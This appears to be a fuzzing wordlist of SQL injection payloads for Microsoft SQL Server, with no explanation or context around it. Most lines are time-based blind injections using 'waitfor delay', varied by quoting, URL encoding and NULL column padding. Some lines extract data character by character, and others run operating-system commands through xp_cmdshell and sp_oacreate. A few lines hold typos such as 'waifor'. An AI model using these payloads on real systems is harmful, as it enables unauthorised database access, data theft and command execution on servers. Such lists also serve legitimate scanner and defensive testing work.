' 1=2 or if (select user) = 'sa' waitfor delay '0:0:5' --
' 1=2 or if ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’ --
' 1=2 or if ASCII(SUBSTRING(‘Admin’,1,1)) = 65 waitfor delay ‘0:0:5’ --
' 1=2 or if (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,0))) > 0 waitfor delay ‘0:0:5’ --
' 1=2 or if (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,1))) > 0 waitfor delay ‘0:0:5’ --
' 1=2 or exec master..xp_cmdshell ‘ping localhost’ --
' if (select user) = 'sa' waitfor delay '0:0:5' --
' if ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’ --
' if ASCII(SUBSTRING(‘Admin’,1,1)) = 65 waitfor delay ‘0:0:5’ --
' if (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,0))) > 0 waitfor delay ‘0:0:5’ --
' if (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,1))) > 0 waitfor delay ‘0:0:5’ --
' exec master..xp_cmdshell ‘ping localhost’ --
;waitfor delay '0:0:__TIME__'--
);waitfor delay '0:0:__TIME__'--
';waitfor delay '0:0:__TIME__'--
";waitfor delay '0:0:__TIME__'--
');waitfor delay '0:0:__TIME__'--
");waitfor delay '0:0:__TIME__'--
));waitfor delay '0:0:__TIME__'--
'));waitfor delay '0:0:__TIME__'--
"));waitfor delay '0:0:__TIME__'--
)%20waitfor%20delay%20'0:0:20'%20/*
)%20waitfor%20delay%20'0:0:20'%20--
')%20waitfor%20delay%20'0:0:20'%20/*
')%20waitfor%20delay%20'0:0:20'%20--
")%20waitfor%20delay%20'0:0:20'%20/*
")%20waitfor%20delay%20'0:0:20'%20--
))%20waitfor%20delay%20'0:0:20'%20/*
))%20waitfor%20delay%20'0:0:20'%20--
'))%20waitfor%20delay%20'0:0:20'%20/*
'))%20waitfor%20delay%20'0:0:20'%20--
"))%20waitfor%20delay%20'0:0:20'%20/*
"))%20waitfor%20delay%20'0:0:20'%20--
,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL)%20waifor%20delay%20'0:0:20'%20/*
',NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL)%20waifor%20delay%20'0:0:20'%20/*
'),NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL)%20waitfor%20delay%20'0:0:20'%20--
,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
'),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
',NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
',NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
',NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
'),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
',NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
'),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
'),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
'),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--
waitfor delay '0:0:20' /*
waitfor delay '0:0:20' --
' waitfor delay '0:0:20' /*
' waitfor delay '0:0:20' --
; IF EXISTS(SELECT * FROM user_db) WAITFOR DELAY '0:0:10'--
declare @o int;exec sp_oacreate 'wscript.shell', @o out;exec sp_oamethod @o, 'run', NULL, 'notepad.exe'
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A' --
